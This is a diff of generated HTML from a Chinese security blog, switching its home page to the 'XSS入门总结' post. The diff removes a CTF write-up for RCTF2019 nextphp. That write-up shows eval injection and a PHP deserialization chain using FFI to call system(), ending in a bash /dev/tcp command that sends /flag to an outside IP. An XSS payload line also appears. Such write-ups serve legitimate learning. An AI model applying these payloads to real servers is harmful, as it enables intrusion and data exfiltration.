@@ -96,24 +96,25 @@
 
 
 
-  <meta name="description" content="空集是所有集合的子集">
-<meta name="keywords" content="Web安全、CTF、代码审计、安全开发、渗透测试、PHP、code">
-<meta property="og:type" content="website">
-<meta property="og:title" content="Huha&#39;s Blog">
-<meta property="og:url" content="http://yoursite.com/index.html">
+  <meta name="description" content="XSS漏洞基础XSS入门介绍https://www.owasp.org/index.php/Cross-site_Scripting_(XSS) 解析器如何工作For example, a  tag may be able to terminate a script block even if it is injected inside a quoted string inside a metho">
+<meta name="keywords" content="XSS,漏洞学习">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XSS入门总结">
+<meta property="og:url" content="http://yoursite.com/2019/07/24/xss入门总结/index.html">
 <meta property="og:site_name" content="Huha&#39;s Blog">
-<meta property="og:description" content="空集是所有集合的子集">
+<meta property="og:description" content="XSS漏洞基础XSS入门介绍https://www.owasp.org/index.php/Cross-site_Scripting_(XSS) 解析器如何工作For example, a  tag may be able to terminate a script block even if it is injected inside a quoted string inside a metho">
 <meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2019-07-24T13:38:29.387Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Huha&#39;s Blog">
-<meta name="twitter:description" content="空集是所有集合的子集">
+<meta name="twitter:title" content="XSS入门总结">
+<meta name="twitter:description" content="XSS漏洞基础XSS入门介绍https://www.owasp.org/index.php/Cross-site_Scripting_(XSS) 解析器如何工作For example, a  tag may be able to terminate a script block even if it is injected inside a quoted string inside a metho">
 
 
 
 
 
 
-  <link rel="canonical" href="http://yoursite.com/">
+  <link rel="canonical" href="http://yoursite.com/2019/07/24/xss入门总结/">
 
 
 
@@ -123,7 +124,7 @@
   };
 </script>
 
-  <title>Huha's Blog</title>
+  <title>XSS入门总结 | Huha's Blog</title>
   
 
 
@@ -171,8 +172,7 @@
     
   
 
-  <div class="container sidebar-position-left 
-  page-home">
+  <div class="container sidebar-position-left page-post-detail">
     <div class="headband"></div>
 
     <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
@@ -210,7 +210,7 @@
         
         
           
-          <li class="menu-item menu-item-home menu-item-active">
+          <li class="menu-item menu-item-home">
 
     
     
@@ -306,214 +306,9 @@
           
           <div id="content" class="content">
             
-  <section id="posts" class="posts-expand">
+
+  <div id="posts" class="posts-expand">
     
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/24/RCTF2019 nextphp writeup/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Huha">
-      <meta itemprop="description" content="空集是所有集合的子集">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Huha's Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                
-                <a href="/2019/07/24/RCTF2019 nextphp writeup/" class="post-title-link" itemprop="url">RCTF2019 nextphp writeup</a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-
-              
-                
-              
-
-              <time title="创建时间：2019-07-24 21:44:42 / 修改时间：21:46:49" itemprop="dateCreated datePublished" datetime="2019-07-24T21:44:42+08:00">2019-07-24</time>
-            
-
-            
-              
-
-              
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a></span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>PHP is the best language!</p>
-<p><a href="http://nextphp.2019.rctf.rois.io" target="_blank" rel="noopener">http://nextphp.2019.rctf.rois.io</a></p>
-<h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>php代码没有对eval函数中的参数进行任何过滤，猜测存在任意命令执行漏洞</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//nextphp.2019.rctf.rois.io/?a=echo phpinfo();</span></span><br></pre></td></tr></table></figure>
-
-<p>查看php配置信息，发现过滤了大多数系统函数<br><img src="https://img-blog.csdnimg.cn/20190520231338443.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODA5ODk2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>但没有过滤scandir()<br><img src="https://img-blog.csdnimg.cn/2019052023003167.png" alt="在这里插入图片描述"></p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//nextphp.2019.rctf.rois.io/?a=var_dump(scandir('/var/www/html'));</span></span><br></pre></td></tr></table></figure>
-
-<p>爆出网站根目录文件</p>
-<p><img src="https://img-blog.csdnimg.cn/20190521012241431.png" alt="在这里插入图片描述"></p>
-<p>利用file_get_contents()查看preload.php源码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view-source:http://nextphp.2019.rctf.rois.io/?a=echo%20file_get_contents(%27preload.php%27);</span><br></pre></td></tr></table></figure>
-
-<p>preload.php源码</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">final <span class="class"><span class="keyword">class</span> <span class="title">A</span> <span class="title">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    protected $data = [</span><br><span class="line">        <span class="string">'ret'</span> =&gt; <span class="literal">null</span>,</span><br><span class="line">        <span class="string">'func'</span> =&gt; <span class="string">'print_r'</span>,</span><br><span class="line">        <span class="string">'arg'</span> =&gt; <span class="string">'1'</span></span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    private <span class="function"><span class="keyword">function</span> <span class="title">run</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;data[<span class="string">'ret'</span>] = $<span class="keyword">this</span>-&gt;data[<span class="string">'func'</span>]($<span class="keyword">this</span>-&gt;data[<span class="string">'arg'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">__serialize</span>(<span class="params"></span>): <span class="title">array</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $<span class="keyword">this</span>-&gt;data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">__unserialize</span>(<span class="params">array $data</span>) </span>&#123;</span><br><span class="line">        array_merge($<span class="keyword">this</span>-&gt;data, $data);</span><br><span class="line">        $<span class="keyword">this</span>-&gt;run();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">serialize</span> (<span class="params"></span>): <span class="title">string</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> serialize($<span class="keyword">this</span>-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">unserialize</span>(<span class="params">$payload</span>) </span>&#123;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;data = unserialize($payload);</span><br><span class="line">        $<span class="keyword">this</span>-&gt;run();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">__get</span> (<span class="params">$key</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $<span class="keyword">this</span>-&gt;data[$key];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">__set</span> (<span class="params">$key, $value</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> \Exception(<span class="string">'No implemented'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">__construct</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> \Exception(<span class="string">'No implemented'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>PHP7.4新特性：新的自定义对象序列化机制<br>  <a href="https://wiki.php.net/rfc/custom_object_serialization" target="_blank" rel="noopener">关于<strong>serialize和</strong>unserialize</a></li>
-</ul>
-<p>观察代码，发现对象反序列时会执行run()方法</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">private <span class="function"><span class="keyword">function</span> <span class="title">run</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    $<span class="keyword">this</span>-&gt;data[<span class="string">'ret'</span>] = $<span class="keyword">this</span>-&gt;data[<span class="string">'func'</span>]($<span class="keyword">this</span>-&gt;data[<span class="string">'arg'</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>可以结合__get魔法函数，获取对象data数组中的元素值</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public <span class="function"><span class="keyword">function</span> <span class="title">__get</span> (<span class="params">$key</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> $<span class="keyword">this</span>-&gt;data[$key];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>构造自己的序列化对象并调用反序列化方法，include引入preload.php页面，注入代码，查看ret参数</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//nextphp.2019.rctf.rois.io/?a=include(%27preload.php%27);var_dump(unserialize(%27C:1:%22A%22:150:&#123;a:3:&#123;s:3:%22ret%22;N;s:4:%22func%22;s:7:%22print_r%22;s:3:%22arg%22;a:3:&#123;s:1:%22a%22;s:5:%22apple%22;s:1:%22b%22;s:6:%22banana%22;s:1:%22c%22;a:3:&#123;i:0;s:1:%22x%22;i:1;s:1:%22y%22;i:2;s:1:%22z%22;&#125;&#125;&#125;&#125;%27)-%3E__get(%27ret%27));</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="https://img-blog.csdnimg.cn/20190520234009226.png" alt="在这里插入图片描述"><br>成功执行print_r()函数打印出数组</p>
-<p>接下来就是想办法使用系统函数，利用将func修改为system或者exec之类的，但转念一想，能执行系统命令的危险函数不是都被过滤了吗？到这里卡住了。</p>
-<h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><p><a href="https://ctftime.org/writeup/15350" target="_blank" rel="noopener">ROIS战队Writeup</a></p>
-<p><strong>preload.php</strong>这个文件名也是hint，google搜索preload site:php.net发现php中的<a href="https://wiki.php.net/rfc/preload" target="_blank" rel="noopener">预加载机制</a><br>配合Writeup中提到了<a href="https://wiki.php.net/rfc/ffi" target="_blank" rel="noopener">FFI扩展</a>可以实现任意代码执行。对于PHP，FFI开辟了一种在纯PHP中编写PHP扩展和绑定到C库的方法。</p>
-<ul>
-<li><p>php.ini配置使用preload预加载与FFI扩展</p>
-  <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ffi.enable = preload </span><br><span class="line">opcache.preload = preload.php</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>注：<br>  在preload机制中，preload.php中定义的所有函数和大多数类都将永久加载到PHP的函数和类表中，并在将来的任何请求的上下文中永久可用，所以在注入代码的时候，并不需要include(‘preload.php’)文件</p>
-</li>
-</ul>
-<p>构造序列化对象</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">    protected $data = [</span><br><span class="line">        <span class="string">'ret'</span> =&gt; <span class="literal">null</span>,</span><br><span class="line">        <span class="string">'func'</span> =&gt; <span class="string">'FFI::cdef'</span>,</span><br><span class="line">        # 使用C库函数</span><br><span class="line">        <span class="string">'arg'</span> =&gt; <span class="string">'int system(const char *command);'</span></span><br><span class="line">    ];</span><br><span class="line">...</span><br><span class="line">	$obj = <span class="keyword">new</span> A;</span><br><span class="line">	$ser = serialize($obj);</span><br><span class="line">	echo $ser; </span><br><span class="line"></span><br><span class="line"># 输出序列化对象</span><br><span class="line">C:<span class="number">1</span>:<span class="string">"A"</span>:<span class="number">95</span>:&#123;<span class="attr">a</span>:<span class="number">3</span>:&#123;<span class="attr">s</span>:<span class="number">3</span>:<span class="string">"ret"</span>;N;s:<span class="number">4</span>:<span class="string">"func"</span>;s:<span class="number">9</span>:<span class="string">"FFI::cdef"</span>;s:<span class="number">3</span>:<span class="string">"arg"</span>;s:<span class="number">32</span>:<span class="string">"int system(const char *command);"</span>;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>Payload</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//nextphp.2019.rctf.rois.io/?a=unserialize('C:1:"A":95:&#123;a:3:&#123;s:3:"ret";N;s:4:"func";s:9:"FFI::cdef";s:3:"arg";s:32:"int system(const char *command);";&#125;&#125;&#125;')-&gt;__get('ret')-&gt;system('bash -c "cat /flag &gt; /dev/tcp/167.99.105.52/8080"');</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="Get-flag"><a href="#Get-flag" class="headerlink" title="Get flag"></a>Get flag</h2><p><img src="https://img-blog.csdnimg.cn/20190521011445961.png" alt="在这里插入图片描述"></p>
-
-          
-        
-      
-    </div>
-
-    
-
-    
-    
-    
-
-    
-
-    
-      
-    
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
 
   
 
@@ -545,10 +340,8 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">
-                
-                
-                <a href="/2019/07/24/xss入门总结/" class="post-title-link" itemprop="url">XSS入门总结</a>
+          <h1 class="post-title" itemprop="name headline">XSS入门总结
+
               
             
           </h1>
@@ -629,9 +422,7 @@
       
 
       
-        
-          
-            <h2 id="XSS漏洞基础"><a href="#XSS漏洞基础" class="headerlink" title="XSS漏洞基础"></a>XSS漏洞基础</h2><h4 id="XSS入门介绍"><a href="#XSS入门介绍" class="headerlink" title="XSS入门介绍"></a>XSS入门介绍</h4><p><a href="https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)" target="_blank" rel="noopener">https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)</a></p>
+        <h2 id="XSS漏洞基础"><a href="#XSS漏洞基础" class="headerlink" title="XSS漏洞基础"></a>XSS漏洞基础</h2><h4 id="XSS入门介绍"><a href="#XSS入门介绍" class="headerlink" title="XSS入门介绍"></a>XSS入门介绍</h4><p><a href="https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)" target="_blank" rel="noopener">https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)</a></p>
 <h4 id="解析器如何工作"><a href="#解析器如何工作" class="headerlink" title="解析器如何工作"></a>解析器如何工作</h4><p>For example, a  tag may be able to terminate a script block even if it is injected inside a quoted string inside a method call inside the script. This happens because the HTML parser runs before the JavaScript parser.</p>
 <ul>
 <li>XSS解析器就是浏览器</li>
@@ -941,8 +732,6 @@
 
 <p>(77)javascript链接</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;A HREF=&quot;javascript:document.location=&apos;http://www.google.com/&apos;&quot;&gt;XSS&lt;/A&gt;</span><br></pre></td></tr></table></figure>
-          
-        
       
     </div>
 
@@ -963,186 +752,42 @@
 
     <footer class="post-footer">
       
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/24/hello-world/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Huha">
-      <meta itemprop="description" content="空集是所有集合的子集">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Huha's Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                
-                <a href="/2019/07/24/hello-world/" class="post-title-link" itemprop="url">Hello World</a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-
-              
-                
-              
-
-              <time title="创建时间：2019-07-24 17:58:17 / 修改时间：21:21:34" itemprop="dateCreated datePublished" datetime="2019-07-24T17:58:17+08:00">2019-07-24</time>
-            
-
-            
-              
-
-              
-            
-          </span>
-
+        <div class="post-tags">
           
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/建站/" itemprop="url" rel="index"><span itemprop="name">建站</span></a></span>
-
-                
-                
-              
-            </span>
+            <a href="/tags/XSS/" rel="tag"># XSS</a>
           
-
+            <a href="/tags/漏洞学习/" rel="tag"># 漏洞学习</a>
           
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
         </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>
-
-          
-        
-      
-    </div>
-
-    
-
-    
-    
-    
-
-    
-
-    
-      
-    
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
       
 
       
       
-        <div class="post-eof"></div>
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/07/24/hello-world/" rel="next" title="Hello World">
+                <i class="fa fa-chevron-left"></i> Hello World
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/07/24/RCTF2019 nextphp writeup/" rel="prev" title="RCTF2019 nextphp writeup">
+                RCTF2019 nextphp writeup <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
       
     </footer>
   </div>
@@ -1152,14 +797,15 @@
   </article>
 
 
-    
-  </section>
-
-  
+  </div>
 
 
           </div>
           
+
+  
+
+
 
         </div>
         
@@ -1180,8 +826,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <div class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <div class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -1267,6 +922,23 @@
         </div>
       </div>
 
+      
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#XSS漏洞基础"><span class="nav-number">1.</span> <span class="nav-text">XSS漏洞基础</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#XSS入门介绍"><span class="nav-number">1.0.1.</span> <span class="nav-text">XSS入门介绍</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#解析器如何工作"><span class="nav-number">1.0.2.</span> <span class="nav-text">解析器如何工作</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#HTML-entities（HTML-实体）"><span class="nav-number">1.0.3.</span> <span class="nav-text">HTML entities（HTML 实体）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#浏览器如何解码（Freebuf博主）"><span class="nav-number">1.0.4.</span> <span class="nav-text">浏览器如何解码（Freebuf博主）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#XSS漏洞复现"><span class="nav-number">1.0.5.</span> <span class="nav-text">XSS漏洞复现</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#DVWA安装："><span class="nav-number">1.0.6.</span> <span class="nav-text">DVWA安装：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#DVWA靶场游玩攻略（XSS）："><span class="nav-number">1.0.7.</span> <span class="nav-text">DVWA靶场游玩攻略（XSS）：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#XSS平台搭建"><span class="nav-number">1.0.8.</span> <span class="nav-text">XSS平台搭建</span></a></li></ol></li></ol><li class="nav-item nav-level-2"><a class="nav-link" href="#XSS漏洞挖掘"><span class="nav-number">2.</span> <span class="nav-text">XSS漏洞挖掘</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#XSS-game"><span class="nav-number">2.0.1.</span> <span class="nav-text">XSS game</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Hack-me"><span class="nav-number">2.0.2.</span> <span class="nav-text">Hack me</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#XSStrike"><span class="nav-number">2.0.3.</span> <span class="nav-text">XSStrike</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#基于DOM的XSS模糊测试论文（基础打好后再看）"><span class="nav-number">2.0.4.</span> <span class="nav-text">基于DOM的XSS模糊测试论文（基础打好后再看）</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#附常见的XSS攻击方法"><span class="nav-number">3.</span> <span class="nav-text">附常见的XSS攻击方法</span></a></li></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
       
 
       
@@ -1389,6 +1061,10 @@
   
 
   
+  <script src="/js/src/scrollspy.js?v=6.7.0"></script>
+<script src="/js/src/post-details.js?v=6.7.0"></script>
+
+
 
   
 
